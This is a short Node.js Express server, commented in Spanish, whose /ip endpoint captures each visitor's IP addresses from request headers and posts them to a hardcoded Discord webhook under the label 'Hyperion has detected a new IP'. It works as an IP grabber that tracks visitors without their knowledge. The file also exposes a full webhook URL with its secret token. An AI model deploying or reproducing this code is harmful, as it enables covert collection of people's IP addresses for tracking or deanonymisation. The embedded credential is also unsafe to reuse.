const express = require("express");
const path = require("path");

const app = express();
const PORT = process.env.PORT || 3000;

// Webhook directo
const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1457199874100432970/2MP1g97e4ngqalHL7L6GsFtkV2RAvFk2JAkHkspnzizKmQ7HKr8b77msdiGxE4YTIzTf";

// Servir frontend
app.use(express.static(path.join(__dirname, "public")));

app.get("/ip", async (req, res) => {
  const raw =
    req.headers["x-forwarded-for"] ||
    req.socket.remoteAddress ||
    "";

  const ips = raw.split(",").map(ip => ip.trim());

  // Respuesta al frontend
  res.json({ ips });

  // Construir descripción para Discord
  const description = ips
    .map((ip, i) => `#${i + 1}. ${ip}`)
    .join("\n");

  // Payload con EMBED
  const payload = {
    embeds: [
      {
        title: "Hyperion has detected a new IP:",
        description: description,
        color: 16711680, // rojo
        footer: {
          text: "Hyperion.IP Server Log"
        },
        timestamp: new Date().toISOString()
      }
    ]
  };

  try {
    await fetch(DISCORD_WEBHOOK, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });
  } catch (err) {
    console.error("Webhook error:", err);
  }
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
